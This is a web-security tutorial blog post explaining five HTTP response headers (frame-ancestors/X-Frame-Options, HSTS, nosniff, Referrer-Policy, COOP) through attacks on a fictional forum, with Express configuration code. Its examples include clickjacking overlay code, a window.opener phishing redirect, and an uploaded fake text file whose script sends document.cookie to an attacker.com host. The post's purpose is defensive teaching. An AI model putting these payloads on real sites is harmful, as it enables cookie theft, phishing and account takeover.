@@ -1,0 +1,528 @@
+---
+title: "HTTP Security Headers: Closing the Gaps CSP Doesn't Cover"
+date: "May 2026"
+pubDate: 2026-05-16
+category: Security
+author: Honey Sharma
+summary: CSP and CORS get the attention, but five other HTTP response headers each close a specific attack vector that everything else leaves open. This post covers clickjacking, SSL stripping, MIME sniffing, referrer leakage, and cross-origin window access — and the one-line server changes that stop each one.
+tags: [security, headers, clickjacking, hsts, csp, referrer-policy, cors, frontend]
+---
+import SequenceDiagram from '../../../components/mdx/SequenceDiagram.astro';
+import PacketDiagram from '../../../components/mdx/PacketDiagram.astro';
+import Comparison from '../../../components/mdx/Comparison.astro';
+import Callout from '../../../components/mdx/Callout.astro';
+import Lessons from '../../../components/mdx/Lessons.astro';
+import Lesson from '../../../components/mdx/Lesson.astro';
+import DecisionFlow from '../../../components/mdx/DecisionFlow.astro';
+
+DevForum shipped a one-click account deletion button last week. Settings page, confirmation step, POST to `/account/delete`. The team tested it thoroughly. The CSRF token is validated. The session cookie is `HttpOnly`, `Secure`, and `SameSite=Strict`.
+
+Forty-eight hours later, three users report their accounts were deleted without their knowledge. No phishing emails. No compromised passwords. No XSS payload in the comment renderer. The session logs show a legitimate POST to `/account/delete` from each victim's browser — with a valid session cookie and a valid CSRF token — at a time when the victim was browsing other sites.
+
+The code is not broken. The CSRF protection is not broken. What is broken is a single missing response header that allows any external site to embed DevForum in an invisible iframe — and use the victim's own mouse click to pull the trigger.
+
+---
+
+## What These Headers Have in Common
+
+The previous posts built defences against specific attack categories: XSS, CSRF, cross-origin data theft, session hijacking. Each one required application code, server-side logic, or careful cookie configuration.
+
+This post is different. The five headers it covers are HTTP response headers — the server sends them, the browser enforces them, and none of your application code is involved in that enforcement. Each header closes a specific attack vector that the previous defences do not address. They are not substitutes for what came before. They are the remaining gaps.
+
+## Clickjacking and Frame Control
+
+### The Attack
+
+DevForum's settings page has a "Delete Account" button. It sits in a form protected by a CSRF token. The token is valid — it came from DevForum's own page.
+
+An attacker builds a page at `evil.com`. It looks like a sweepstakes: a large "Claim Your Free Month!" button in the centre. Hidden behind it, invisible to the user, is DevForum's settings page loaded inside a transparent iframe:
+
+```css
+/* evil.com's stylesheet */
+iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  opacity: 0;           /* invisible */
+  z-index: 999;         /* sits on top of everything */
+  pointer-events: all;  /* captures all clicks */
+}
+```
+
+```html
+<!-- evil.com -->
+<button class="prize-button">Claim Your Free Month!</button>
+<iframe src="https://devforum.com/settings"></iframe>
+```
+
+The iframe is positioned so that DevForum's "Delete Account" button aligns exactly with the visible prize button. The victim sees the prize button. Their click goes to the iframe.
+
+<SequenceDiagram
+  title="Clickjacking — The Invisible iframe"
+  actors={[
+    { id: "evil",    label: "evil.com",         variant: "malicious" },
+    { id: "browser", label: "Victim's Browser", icon: "browser" },
+    { id: "forum",   label: "devforum.com",      icon: "server", variant: "trusted" }
+  ]}
+  messages={[
+    { from: "evil",    to: "browser", label: "Serves page: visible prize button + transparent iframe over devforum.com/settings", type: "attack" },
+    { from: "browser", to: "browser", label: "User sees 'Claim Your Free Month!' and clicks it", type: "note", annotation: "click registers on the transparent iframe beneath, not the visible button" },
+    { from: "browser", to: "forum",   label: "POST /account/delete", sublabel: "Cookie: __Host-session=abc123 — CSRF token present from the real DevForum form", type: "attack", highlight: true },
+    { from: "forum",   to: "browser", label: "200 OK — account deleted", type: "response", annotation: "valid token, valid session — server has no reason to reject" }
+  ]}
+  caption="The browser loaded DevForum's real settings page inside the iframe — including the real CSRF token. The victim's click submitted that real form. Nothing in the request was forged."
+/>
+
+**Why the CSRF token does not save you here.** The iframe loaded DevForum's settings page. That page contains a real form with a real CSRF token generated by DevForum's server. When the user clicked, they submitted DevForum's real form with DevForum's real token. The server validates the token and finds it correct — because it is. The attack is not a forged request. It is a genuine, fully authenticated request that the victim never knowingly made.
+
+### The Defence: `X-Frame-Options`
+
+`X-Frame-Options` is a response header that tells the browser whether this page is allowed to be embedded in a `<iframe>`, `<frame>`, or `<object>`. If the policy is violated, the browser refuses to render the embedded page — the iframe loads blank.
+
+```http
+X-Frame-Options: DENY
+X-Frame-Options: SAMEORIGIN
+```
+
+`DENY` — no site may frame this page. An iframe pointing to `devforum.com/settings` on any origin renders nothing, including DevForum itself.
+
+`SAMEORIGIN` — only pages on the same origin as `devforum.com` may frame this page. `evil.com`'s iframe renders blank. An iframe inside DevForum itself (for an admin preview panel, for example) renders normally.
+
+### The Modern Version: CSP `frame-ancestors`
+
+`X-Frame-Options` is the legacy header. Content Security Policy's `frame-ancestors` directive does the same job with more precision — you control exactly which origins are allowed to embed the page.
+
+```http
+Content-Security-Policy: frame-ancestors 'none'
+Content-Security-Policy: frame-ancestors 'self'
+Content-Security-Policy: frame-ancestors 'self' https://admin.devforum.com
+```
+
+`frame-ancestors 'none'` is equivalent to `X-Frame-Options: DENY`.
+
+`frame-ancestors 'self'` is equivalent to `SAMEORIGIN`.
+
+`frame-ancestors 'self' https://admin.devforum.com` is something `X-Frame-Options` cannot express at all — the page can be embedded only by `devforum.com` itself and by `admin.devforum.com`, not by any other origin.
+
+<Comparison
+  headers={["", "X-Frame-Options", "CSP frame-ancestors"]}
+  rows={[
+    ["Specification",     "Legacy — RFC 7034",         "CSP Level 2 — W3C standard"],
+    ["Browser support",   "Universal including IE9+",   "All modern browsers; not IE"],
+    ["Allowed values",    "DENY or SAMEORIGIN only",    "Any origin list; wildcards; 'none'; 'self'"],
+    ["Multiple origins",  "Not supported",              "Supported — space-separated list"],
+    ["When both present", "Respected as fallback",      "Takes precedence in supporting browsers"],
+  ]}
+  caption="frame-ancestors is the right answer for any browser built in the last five years. X-Frame-Options is the fallback for older environments. Set both — the cost is one extra response header."
+/>
+
+<DecisionFlow
+  title="Choosing Your Frame Embedding Policy"
+  nodes={[
+    { id: "start",      type: "start",    label: "Does this page need to be embeddable in an iframe?" },
+    { id: "selfonly",   type: "decision", label: "Embeddable only by your own origin?" },
+    { id: "partners",   type: "decision", label: "Embeddable by specific trusted external origins?" },
+    { id: "deny",       type: "result",   label: "frame-ancestors 'none'\nX-Frame-Options: DENY\n\nSettings, checkout, auth, account actions" },
+    { id: "same",       type: "result",   label: "frame-ancestors 'self'\nX-Frame-Options: SAMEORIGIN\n\nAdmin preview panels, internal dashboards" },
+    { id: "allowlist",  type: "result",   label: "frame-ancestors 'self' https://partner.com\n\nX-Frame-Options cannot express this — use CSP only" },
+  ]}
+  edges={[
+    { from: "start",    to: "deny",      label: "no — most pages" },
+    { from: "start",    to: "selfonly",  label: "yes" },
+    { from: "selfonly", to: "same",      label: "yes" },
+    { from: "selfonly", to: "partners",  label: "no" },
+    { from: "partners", to: "allowlist", label: "yes" },
+    { from: "partners", to: "deny",      label: "no" },
+  ]}
+  caption="The correct answer for settings pages, checkout flows, account deletion confirmations, and any authenticated action is always 'none'. Framing should be a deliberate choice, not a default."
+/>
+
+<Callout type="tip" title="Set both headers — they cover different browser populations">
+  Modern browsers see `frame-ancestors` and ignore `X-Frame-Options` when both are present. Older browsers that do not support CSP Level 2 (IE, older Edge) fall back to `X-Frame-Options`. Setting both headers costs nothing and covers the entire browser population. Never rely on only one.
+</Callout>
+
+## Strict-Transport-Security: Enforcing HTTPS at the Browser Level
+
+### The Connection to Cookie Security
+
+The previous post covered the `Secure` cookie flag: the browser only sends a `Secure` cookie over HTTPS — it is never transmitted over HTTP, even if the user navigates to `http://` explicitly.
+
+That guarantee depends entirely on the browser connecting over HTTPS in the first place. What happens before the connection is established? What if the user types `http://devforum.com` in the address bar? What if a link in an old email points to the HTTP version of the site? What if the network itself intercepts the request before the HTTPS upgrade fires?
+
+### The Attack: SSL Stripping
+
+SSL stripping is a network-level attack. An attacker positioned between the victim and the internet — on a public WiFi network, at a compromised router, or at a corporate gateway — intercepts the victim's initial unencrypted HTTP request before it reaches the server. Rather than forwarding it, they substitute their own HTTP response, silently relaying the real HTTPS connection on the victim's behalf.
+
+<SequenceDiagram
+  title="SSL Stripping — Intercepting the HTTP→HTTPS Upgrade"
+  actors={[
+    { id: "browser",  label: "Victim's Browser", icon: "browser" },
+    { id: "attacker", label: "Attacker (same WiFi)", variant: "malicious" },
+    { id: "forum",    label: "devforum.com", icon: "server", variant: "trusted" }
+  ]}
+  messages={[
+    { from: "browser",  to: "attacker", label: "GET http://devforum.com", sublabel: "plaintext — sent over unencrypted network before any HTTPS upgrade", type: "request", highlight: true },
+    { from: "attacker", to: "forum",    label: "GET https://devforum.com", sublabel: "attacker relays to the real server over HTTPS", type: "attack" },
+    { from: "forum",    to: "attacker", label: "301 → https://devforum.com (legitimate redirect)", type: "response" },
+    { from: "attacker", to: "browser",  label: "200 OK — served over HTTP", sublabel: "attacker strips the redirect, rewrites HTTPS links to HTTP, reads all traffic in plaintext", type: "attack", annotation: "login credentials, session tokens, form data — all visible" }
+  ]}
+  caption="The attacker sits between the browser and devforum.com. The browser's initial HTTP request is plaintext — the attacker intercepts it before devforum.com's HTTPS redirect can arrive and substitutes their own HTTP response."
+/>
+
+The `Secure` flag on the session cookie does not help here. The browser's previous HTTPS session set the cookie correctly. The attacker is not stealing the cookie through the network — they are relaying the victim's HTTP session, reading the form submissions and responses that pass through them in plaintext.
+
+### The Defence: `Strict-Transport-Security`
+
+HSTS (HTTP Strict Transport Security) instructs the browser to always use HTTPS for a domain — regardless of what URL was typed, what link was followed, or what redirect was received. The browser enforces this itself, *before* making any network request. The network never sees an HTTP request at all.
+
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
+
+<PacketDiagram
+  title="Strict-Transport-Security Header — Every Directive Explained"
+  rows={[
+    {
+      label: "Strict-Transport-Security",
+      fields: [
+        { name: "max-age=31536000", color: "green", description: "Remember this policy for 1 year (31,536,000 seconds). For the next 365 days, the browser will refuse to connect to this domain over HTTP — it upgrades the request to HTTPS internally before any network packet is sent.", highlight: true },
+        { name: "includeSubDomains", color: "green", description: "Apply the policy to all subdomains. Without this, api.devforum.com, blog.devforum.com, and other subdomains are still reachable over HTTP. An attacker can strip SSL on a subdomain and pivot from there." },
+        { name: "preload", color: "blue", description: "Signal readiness for the HSTS preload list — a list of HTTPS-only domains shipped inside Chrome, Firefox, Safari, and Edge. Preloaded domains get HTTPS enforcement even on a first visit, before any header has been seen." },
+      ]
+    }
+  ]}
+  caption="max-age alone protects returning visitors who have already received the header. includeSubDomains closes the subdomain loophole. preload covers first-time visitors — the one gap max-age cannot address."
+/>
+
+<Callout type="warning" title="HSTS is sticky — deploy it carefully">
+  Once a browser stores an HSTS policy, it enforces it for `max-age` seconds regardless of what the server later sends. If HTTPS breaks on your domain during that window (certificate lapse, misconfiguration, DNS change), browsers will block access — they will not fall back to HTTP. Start with `max-age=3600` (one hour) while testing. Once you are confident HTTPS works correctly across all subdomains, increase to `max-age=31536000`. Add `preload` only after the full `max-age` is set and verified.
+</Callout>
+
+<Callout type="tip" title="Preload: HTTPS protection before the very first visit">
+  The `max-age` directive only protects users who have already visited your site and received the HSTS header. A brand-new user's first request is still vulnerable to SSL stripping — they have no stored policy yet. The HSTS preload list solves this: browsers ship with a built-in list of HTTPS-only domains. Submit your domain at `hstspreload.org` (requirements: `max-age` ≥ 31536000, `includeSubDomains`, `preload`, and all subdomains must serve valid HTTPS). Once included, every user on every browser connects over HTTPS on their very first visit.
+</Callout>
+
+## `X-Content-Type-Options`: Stopping MIME Sniffing
+
+### The Attack: When the Browser Overrules the Server
+
+DevForum allows users to upload text attachments to posts — changelogs, configuration samples, code snippets. The server stores the file, inspects the extension, and serves it with `Content-Type: text/plain`. That seems safe.
+
+An attacker uploads a file named `changelog.txt` with this content:
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: document.cookie
+  });
+</script>
+</body>
+</html>
+```
+
+The server sets `Content-Type: text/plain` — it is a `.txt` file. The attacker posts a link to it in the comments. A user clicks it. The browser downloads the file, looks at the first bytes, and notices the content starts with `<!DOCTYPE html>`. It decides the server's `text/plain` declaration must be wrong. It re-interprets the file as HTML. The script executes.
+
+This is **MIME sniffing** — the browser inferring a resource's content type by inspecting its bytes rather than trusting the server's `Content-Type` header. It was introduced as a compatibility mechanism for misconfigured servers. It became a persistent XSS vector.
+
+### The Defence
+
+```http
+X-Content-Type-Options: nosniff
+```
+
+One header. One directive. No configuration. `nosniff` tells the browser: trust the `Content-Type` header exactly as the server sent it. Do not inspect the content. Do not override the declared type.
+
+With `nosniff`, the attacker's file is served as `text/plain` and displayed as raw text in the browser. The `<script>` tag is never parsed. The attack does not exist.
+
+<Callout type="tip" title="Set X-Content-Type-Options globally — there are no tradeoffs">
+  Unlike most headers in this post, `X-Content-Type-Options: nosniff` has no configuration decision and no meaningful tradeoffs. If your server sets correct `Content-Type` headers (it should), `nosniff` changes nothing for legitimate users. Set it once in your global middleware and it never needs revisiting.
+</Callout>
+
+## `Referrer-Policy`: Controlling What URLs Leak to Third Parties
+
+### The Attack: Your URLs Arriving on Someone Else's Server
+
+DevForum launches a discounted Pro plan. The checkout URL for the offer is:
+
+```
+https://devforum.com/checkout?plan=pro&discount=WELCOME50&ref=email-march
+```
+
+The checkout page loads a third-party analytics script. When that script fires its tracking beacon, the browser attaches the `Referer` header to the outbound request:
+
+```http
+GET /collect HTTP/1.1
+Host: analytics.example.com
+Referer: https://devforum.com/checkout?plan=pro&discount=WELCOME50&ref=email-march
+```
+
+The analytics provider now has the discount code, the campaign attribution, and a user's checkout intent — none of which they were intended to receive.
+
+The problem is more serious for authentication-adjacent pages. A password reset page:
+
+```
+https://devforum.com/reset-password?token=a1b2c3d4e5f6g7h8
+```
+
+If that page includes any external resource — an image, a font, an analytics script — the reset token appears in the `Referer` header of every outbound request that page makes. It lands in server access logs, analytics dashboards, and CDN logs you do not control.
+
+<Callout type="info" title="fetch() and XHR also send the Referer header">
+  It is not only page navigations that leak the referring URL. Every `fetch()` call, `XMLHttpRequest`, image load, script load, and stylesheet request from a page includes the `Referer` header for that page's URL. A checkout page with ten third-party script tags leaks the full checkout URL to ten separate servers — on every page load, for every user.
+</Callout>
+
+### The `Referrer-Policy` Values
+
+<Comparison
+  headers={["Policy", "Same-origin requests", "Cross-origin (HTTPS → HTTPS)", "Cross-origin (HTTPS → HTTP)"]}
+  rows={[
+    ["no-referrer",                     "Nothing sent",  "Nothing sent",   "Nothing sent"],
+    ["origin",                          "Origin only",   "Origin only",    "Origin only"],
+    ["same-origin",                     "Full URL",      "Nothing sent",   "Nothing sent"],
+    ["strict-origin",                   "Origin only",   "Origin only",    "Nothing sent"],
+    ["strict-origin-when-cross-origin", "Full URL",      "Origin only",    "Nothing sent"],
+    ["no-referrer-when-downgrade",      "Full URL",      "Full URL",       "Nothing sent"],
+    ["unsafe-url",                      "Full URL",      "Full URL",       "Full URL"],
+  ]}
+  caption="'Origin only' means https://devforum.com — the scheme and host, no path and no query string. 'Full URL' includes the complete path and query parameters, including any tokens or sensitive values."
+/>
+
+**The recommended default: `strict-origin-when-cross-origin`.**
+
+- **Same-origin requests** (DevForum to DevForum's own API): full URL — internal analytics, navigation tracking, and search still work correctly.
+- **Cross-origin HTTPS requests** (DevForum's page to `analytics.google.com`): origin only — the analytics provider knows the user came from `devforum.com`, but not which page, not which query parameters, not which tokens.
+- **Cross-origin HTTP requests** (HTTPS page to an HTTP destination): nothing — no referrer data crosses a protocol downgrade.
+
+```http
+Referrer-Policy: strict-origin-when-cross-origin
+```
+
+For routes that specifically handle security-sensitive tokens, apply a stricter policy at the route level:
+
+```js
+// Express — per-route override for sensitive endpoints
+app.use('/reset-password', (req, res, next) => {
+  res.setHeader('Referrer-Policy', 'no-referrer');
+  next();
+});
+
+app.use('/email-confirm', (req, res, next) => {
+  res.setHeader('Referrer-Policy', 'no-referrer');
+  next();
+});
+```
+
+The URL of a password reset page, an email confirmation page, or a payment callback should never appear in any server's access log other than your own.
+
+## `Cross-Origin-Opener-Policy`: Severing the Cross-Window Reference
+
+### The Problem: `window.opener`
+
+When a page opens a new tab using `window.open()`, both the opener and the opened page maintain a scripted reference to each other. The opened page can access `window.opener` — a live reference to the page that opened it.
+
+DevForum's account creation flow opens a third-party identity verification service in a new tab:
+
+```js
+// devforum.com — opens verification in a new tab
+const verifyTab = window.open('https://verify.example.com/start');
+```
+
+The `verify.example.com` page can now run:
+
+```js
+// verify.example.com — accesses the page that opened it
+window.opener.location.href = 'https://evil.com/fake-devforum-login';
+```
+
+The original DevForum tab is silently redirected to a phishing page. The user, switching back from the verification tab, sees a login form they don't remember seeing and enters their credentials. This attack is called **tab-napping**.
+
+The reverse scenario is equally dangerous. If an attacker tricks DevForum into opening their page via a link in user content, the attacker's page can access `window.opener` and navigate the DevForum tab to a fake login page.
+
+<SequenceDiagram
+  title="Tab-napping — The window.opener Reference"
+  actors={[
+    { id: "forum",    label: "devforum.com (tab 1)", icon: "browser", variant: "trusted" },
+    { id: "verify",   label: "verify.example.com (tab 2)", variant: "malicious" },
+    { id: "evil",     label: "evil.com",  variant: "malicious" }
+  ]}
+  messages={[
+    { from: "forum",  to: "verify",  label: "window.open('https://verify.example.com')", sublabel: "tab 2 opens — window.opener points back to tab 1", type: "request" },
+    { from: "verify", to: "forum",   label: "window.opener.location = 'https://evil.com/fake-login'", sublabel: "verify.example.com redirects the original DevForum tab without user interaction", type: "attack", highlight: true },
+    { from: "forum",  to: "evil",    label: "DevForum tab now shows evil.com phishing page", type: "attack", annotation: "user returns to tab 1, sees a login form, enters credentials" }
+  ]}
+  caption="The user opened a verification tab and switched away. While they were gone, the verification site silently redirected the original DevForum tab. When the user returns, they see a fake login page."
+/>
+
+### The Defence
+
+```http
+Cross-Origin-Opener-Policy: same-origin
+```
+
+`COOP: same-origin` places the page in its own isolated browsing context group. Cross-origin windows can no longer hold a reference to this page's window — `window.opener` in a cross-origin tab returns `null` instead of the opener's window object. The scripted connection is severed before any attack can run.
+
+Three values:
+
+```http
+Cross-Origin-Opener-Policy: unsafe-none            # browser default — no isolation
+Cross-Origin-Opener-Policy: same-origin-allow-popups # this page can open cross-origin popups; those popups cannot access window.opener back
+Cross-Origin-Opener-Policy: same-origin            # full isolation in both directions
+```
+
+For most applications, `same-origin` is the right setting. The exception: if your authentication flow opens an OAuth provider in a popup and communicates back via `window.opener.postMessage()`, `same-origin` will break that flow — the opener reference will be null. Use `same-origin-allow-popups` in that case, which lets you open cross-origin popups while still preventing inbound `window.opener` access from those popups.
+
+<Callout type="info" title="COOP enables cross-origin isolation — required for some APIs">
+  Setting `Cross-Origin-Opener-Policy: same-origin` alongside `Cross-Origin-Embedder-Policy: require-corp` enables **cross-origin isolation** — a browser security mode required to use `SharedArrayBuffer` and high-resolution `performance.now()` timers. These APIs were restricted after the Spectre CPU vulnerability class was disclosed, because high-resolution timers can be used to measure cache-timing side channels. If your application uses WebAssembly, audio worklets, or performance-sensitive parallel computation, cross-origin isolation is a prerequisite — and COOP is half of it.
+</Callout>
+
+## All Five Headers in One View
+
+DevForum's hardened response headers for an authenticated page:
+
+<PacketDiagram
+  title="DevForum — Complete HTTP Security Header Set"
+  rows={[
+    {
+      label: "HTTP/1.1 200 OK",
+      fields: [
+        { name: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains; preload", color: "green", description: "Forces HTTPS for 1 year on all subdomains. Prevents SSL stripping — the browser never sends an HTTP request for this domain again.", highlight: true },
+        { name: "X-Frame-Options", value: "DENY", color: "green", description: "Legacy clickjacking prevention — blocks all iframe embedding. Set alongside frame-ancestors for full browser coverage." },
+        { name: "Content-Security-Policy", value: "frame-ancestors 'none'; ...", color: "green", description: "Modern clickjacking prevention. Takes precedence over X-Frame-Options in supporting browsers. Allows specific origins when needed." },
+        { name: "X-Content-Type-Options", value: "nosniff", color: "blue", description: "Prevents MIME sniffing — browser trusts the declared Content-Type exactly. Blocks the uploaded-HTML-as-text-file XSS vector." },
+        { name: "Referrer-Policy", value: "strict-origin-when-cross-origin", color: "blue", description: "Cross-origin requests get the origin only — no path, no query parameters, no tokens. Prevents sensitive URL leakage to third-party servers." },
+        { name: "Cross-Origin-Opener-Policy", value: "same-origin", description: "Severs window.opener access between cross-origin windows. Prevents tab-napping and cross-window DOM manipulation.", color: "purple" },
+      ]
+    }
+  ]}
+  caption="Each header is independent — each one closes a different attack vector. The browser enforces all of them before any application code runs."
+/>
+
+## Defence-in-Depth: What Each Header Stops
+
+<Comparison
+  headers={["Header", "Attack it stops", "What it does not cover", "Where enforced"]}
+  rows={[
+    [
+      "X-Frame-Options\nCSP frame-ancestors",
+      "Clickjacking — victim's click captured by a transparent iframe overlay",
+      "Does not prevent CSRF, XSS, or any attack that does not use iframe embedding",
+      "Browser — at iframe load time"
+    ],
+    [
+      "Strict-Transport-Security",
+      "SSL stripping — network interception of the HTTP-to-HTTPS upgrade; protocol downgrade",
+      "Does not protect if the TLS certificate itself is compromised; does not help if HTTPS is not configured correctly",
+      "Browser — before any network request is sent"
+    ],
+    [
+      "X-Content-Type-Options",
+      "MIME sniffing — browser executing uploaded text files as HTML or script",
+      "Does not prevent XSS through correctly typed content channels; only controls content-type interpretation",
+      "Browser — at resource load time"
+    ],
+    [
+      "Referrer-Policy",
+      "Referrer leakage — sensitive URL components (tokens, discount codes, session hints) sent to third-party servers",
+      "Does not prevent other data leakage via cookies, localStorage, or request bodies",
+      "Browser — on every outbound fetch, navigation, and resource request"
+    ],
+    [
+      "Cross-Origin-Opener-Policy",
+      "Tab-napping — cross-origin window.opener scripted access; silent tab redirection",
+      "Does not prevent other cross-origin attacks; may break OAuth popup flows if set to same-origin instead of same-origin-allow-popups",
+      "Browser — at window/tab creation time"
+    ],
+  ]}
+  caption="None of these headers replaces the defences from previous posts — they close the gaps that XSS prevention, CSRF tokens, cookie attributes, and CSP leave open."
+/>
+
+## Setting All Headers in Express
+
+The easiest approach in production is [Helmet](https://helmetjs.github.io/) — a middleware package that manages all common security headers with sensible defaults:
+
+```js
+import helmet from 'helmet';
+
+app.use(helmet());
+// Sets X-Content-Type-Options, X-Frame-Options, and several others by default
+
+// Add or override specific headers:
+app.use(
+  helmet({
+    hsts: {
+      maxAge: 31536000,
+      includeSubDomains: true,
+      preload: true,
+    },
+    referrerPolicy: {
+      policy: 'strict-origin-when-cross-origin',
+    },
+    crossOriginOpenerPolicy: {
+      policy: 'same-origin',
+    },
+    contentSecurityPolicy: {
+      directives: {
+        frameAncestors: ["'none'"],
+        // ... other CSP directives
+      },
+    },
+  })
+);
+```
+
+If you prefer explicit control without a third-party library:
+
+```js
+// Global security header middleware
+app.use((req, res, next) => {
+  // Clickjacking
+  res.setHeader('X-Frame-Options', 'DENY');
+  // HTTPS enforcement
+  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
+  // MIME sniffing
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  // Referrer leakage
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  // Cross-window access
+  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
+  next();
+});
+
+// Per-route override for sensitive endpoints
+app.use('/reset-password', (req, res, next) => {
+  res.setHeader('Referrer-Policy', 'no-referrer');
+  next();
+});
+```
+
+<Callout type="tip" title="Verify your headers with securityheaders.com">
+  After deploying, paste your domain into securityheaders.com. It fetches your live response headers and grades them — including headers this post does not cover. An A grade means the common browser-level vectors are closed. It is the fastest way to confirm the headers are actually being sent by your production server, not just set in your local code.
+</Callout>
+
+---
+
+<Lessons title="HTTP Security Headers Checklist" type="recommendations">
+  <Lesson title="Set frame-ancestors 'none' and X-Frame-Options: DENY on every authenticated page">
+    Any page a logged-in user can interact with — settings, checkout, account deletion, admin panels — must not be embeddable. Clickjacking requires no code vulnerability: the only prerequisite is that the page can be loaded in an iframe. Set both headers for full browser coverage. frame-ancestors handles modern browsers; X-Frame-Options handles the rest.
+  </Lesson>
+  <Lesson title="Use frame-ancestors with a specific allowlist when selective embedding is needed">
+    If you intentionally embed your own pages (admin dashboards, preview panels) or partner integrations, `frame-ancestors 'self' https://partner.com` is the right tool. Do not open to SAMEORIGIN when only a specific subdomain needs access — be precise. X-Frame-Options cannot express per-origin allowlists; use CSP only for this case.
+  </Lesson>
+  <Lesson title="Deploy HSTS with a short max-age first, then increase">
+    HSTS is sticky — browsers enforce the stored policy for max-age seconds even if your server stops sending the header or HTTPS breaks. Start with `max-age=3600` while testing. Once you confirm HTTPS works correctly across all subdomains, increase to `max-age=31536000` and add `preload`. Submit to hstspreload.org only after the full max-age is confirmed — removal from the preload list is slow.
+  </Lesson>
+  <Lesson title="Set X-Content-Type-Options: nosniff globally with no exceptions">
+    There is no legitimate use case for MIME sniffing in a modern web application. Apply it once in global middleware. It has no configuration options, no tradeoffs, and no side effects on correctly typed responses.
+  </Lesson>
+  <Lesson title="Override Referrer-Policy to no-referrer on every route that handles tokens or sensitive parameters">
+    `strict-origin-when-cross-origin` is the right global default. But any route whose URL contains a security-sensitive value — password reset token, email confirmation token, payment callback reference — should override to `no-referrer` at the route level. That URL must not appear in any access log, analytics system, or CDN cache you do not control.
+  </Lesson>
+  <Lesson title="Test COOP against your OAuth and payment flows before deploying">
+    `Cross-Origin-Opener-Policy: same-origin` severs window.opener references in both directions. If your authentication flow opens an OAuth provider in a popup and communicates back via `window.opener.postMessage()`, this setting will break it — the opener reference will be null. Use `same-origin-allow-popups` when you need to open cross-origin popups while still preventing inbound opener access. Run your full auth and payment flow in staging before deploying to production.
+  </Lesson>
+</Lessons>
